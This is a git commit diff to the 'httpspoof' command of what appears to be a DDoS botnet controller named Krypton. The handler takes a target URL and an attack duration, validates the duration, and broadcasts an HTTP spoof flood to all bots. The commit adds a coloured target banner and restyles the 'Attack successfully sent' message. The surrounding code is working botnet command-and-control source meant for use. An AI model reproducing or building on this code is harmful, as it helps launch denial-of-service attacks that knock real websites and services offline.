85dec7f46e390a63ded58696c28e98a2a9868f91
cirqueira <118860604+CirqueiraDev@users.noreply.github.com>
2024-01-22 16:12:42 -0300

    Update httpspoof.py

--- src/Commands/Methods_L7/httpspoof.py
+++ src/Commands/Methods_L7/httpspoof.py
@@ -4,8 +4,16 @@ def httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data):
     if len(args) == 3:
         url = args[1]
         secs = args[2]
+
+        xxxx = '''%s============= (%sTARGET%s) ==============
+            %s URL:%s %s
+            %sTIME:%s %s
+          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, url, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, 'HTTP SPOOF')
+
         if validate_time(secs):
-            send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
+            for x in xxxx.split('\n'):
+                send(client, '\x1b[3;31;40m'+ x)
+            send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
             broadcast(data)
         else:
             send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
